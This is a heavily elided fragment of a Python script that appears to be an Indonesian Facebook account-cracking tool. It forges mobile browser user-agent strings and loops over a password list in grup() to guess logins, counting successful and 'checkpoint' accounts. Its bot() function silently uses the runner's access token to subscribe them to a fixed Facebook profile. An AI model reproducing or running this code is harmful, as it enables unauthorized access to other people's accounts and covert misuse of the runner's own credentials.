...
for xd in range(10000):
	a='Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1/'
	...
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1'
...
for x in range(10):
	...
	i='; U; Bada/1.2; en-us) AppleWebKit/605.1.15 (KHTML, like Gecko) Dolfin/'
...
def bot():
	try:
		requests.post("https://graph.facebook.com/1411310517?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
...
def grup():
	...
	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17D50 QQ/8.3.6.618 V1_IPH_SQ_8.3.6_1_APP_A Pixel/1125 SimpleUISwitch/0 QQTheme/1000 Core/WKWebView Device/Apple(iPhone 11 Pro) NetType/WIFI QBWebViewType/1 WKType/1'
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.0.1 ((iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/17D50 QQ/8.3.6.618 V1_IPH_SQ_8.3.6_1_APP_A Pixel/1125 SimpleUISwitch/0 QQTheme/1000 Core/WKWebView Device/Apple(iPhone 11 Pro) NetType/WIFI QBWebViewType/1 WKType/1]" }
				if 'no' in taplikasi:
					ok+=1
